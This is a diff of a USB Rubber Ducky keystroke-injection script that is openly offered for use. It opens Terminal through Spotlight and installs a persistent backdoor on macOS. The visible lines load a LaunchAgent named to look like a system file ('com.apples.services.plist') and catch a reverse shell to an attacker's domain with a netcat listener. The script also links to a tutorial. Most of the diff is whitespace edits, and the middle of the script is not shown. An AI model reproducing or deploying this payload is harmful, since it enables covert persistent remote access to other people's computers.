@@ -2,11 +2,13 @@
 * Insert ducky. This script will created a persistent backdoor as the current user. It works by injecting code into a terminal from Spotlight. This payload was encoded with v2.4 on firmware duck_v2.1.hex. Change to your IP address or domain name and port number. 
 * A good tutorial on the payload here: http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
 
-REM Patrick Mosca
+
+ REM Patrick Mosca
 REM A simple script for creating a persistent backdoor on OSX.
 REM Change mysite.com to your domain name or IP address
 REM Change 1337 to your port number
 REM Catch the shell with 'nc -l -p 1337'
+REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
 DELAY 1000
 GUI SPACE
 STRING terminal
@@ -70,7 +72,8 @@ DELAY 200
 STRING launchctl load ~/Library/LaunchAgents/com.apples.services.plist
 ENTER
 DELAY 200
-GUI q
- 
+GUI q 
+
 Catch the shell with netcat:
+
  nc -l -p 1337
